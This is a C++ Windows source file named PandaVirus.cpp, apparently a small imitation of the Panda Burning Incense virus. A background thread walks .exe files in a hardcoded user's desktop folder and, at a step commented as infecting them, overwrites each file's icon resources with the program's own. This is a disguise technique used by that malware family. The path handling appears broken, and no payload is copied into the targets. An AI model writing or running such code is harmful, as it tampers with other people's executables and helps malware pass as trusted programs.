// PandaVirus.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "PandaVirus.h"
#include "stdio.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
//Working Thread Process Function
DWORD WINAPI WorkProc(LPVOID lpParam);
//Setting Modify Program Icons
BOOL SetExeIcon(char* szCurrentExePath, char* szObjectPath);
//Enum Resource Name CallBack Function
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPSTR lpszName, LONG lparam);
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: 在此处放置代码。

	// 初始化全局字符串
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_PANDAVIRUS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PANDAVIRUS));

	MSG msg;

	// 主消息循环:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASS wcex;
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	return RegisterClass(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // 将实例句柄存储在全局变量中

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		600, 300, 400, 300, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE://Create WindowView Message
		CreateThread(NULL, NULL, WorkProc, NULL, 0, NULL);
		break;
	case WM_COMMAND:
		break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: 在此处添加使用 hdc 的任何绘图代码...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

//Working Thread Process Function
DWORD WINAPI WorkProc(LPVOID lpParam) {

	WIN32_FIND_DATA wfd = { 0 };
	//Finding to C_Disk Desktop Has Suffix Of ".exe" File 
	HANDLE hFinder = FindFirstFile("C:\\Users\\zengh\\Desktop\\*.exe", &wfd);
	if (hFinder == INVALID_HANDLE_VALUE)  return 0;

	while (1)
	{
		if (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			//Get Path Of Program 
			char szExePath[MAX_PATH];
			sprintf(szExePath, "\\%s", wfd.cFileName);
			MessageBox(NULL, szExePath, "Alert", MB_OK);

			//Infect "exe"
			char szCurrentPath[MAX_PATH];
			GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
			SetExeIcon(szCurrentPath, szExePath);

		}

		if (!FindNextFile(hFinder, &wfd)) break;
	}
	return 0;
}

//Setting Modify Program Icons
BOOL SetExeIcon(char* szCurrentExePath, char* szObjectPath)
{
	//Enum To Binary Block Resource_Class Of This Type
	EnumResourceNames(hInst, RT_ICON, EnumIconProc, (LONG)szObjectPath);
	return TRUE;
}
//Enum Resource Name CallBack Function
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPSTR lpszName, LONG lparam)
{
	//Find Resource
	HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
	if (hRes == NULL)
		return FALSE;

	//Loading Resource
	HGLOBAL hResLoad = LoadResource(hModule, hRes);
	//For Resource to Locked
	LPVOID pData = LockResource(hResLoad);
	if (!hResLoad)
		return FALSE;

	if (pData == NULL)
		return FALSE;

	//Get Resource Sizeof
	DWORD dwSize = SizeofResource(hModule, hRes);

	if (lparam)
	{
		//Setting Resource
		//Begin Update Resource
		HANDLE hExe = BeginUpdateResource((LPSTR)lparam, FALSE);
		if (hExe == NULL) return FALSE;

		//Update
		int nRet = UpdateResource(hExe, RT_ICON, lpszName, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pData, dwSize);

		if (!nRet)
			return FALSE;
		//Over Update
		EndUpdateResource(hExe, FALSE);
		return TRUE;
	}

	return FALSE;
}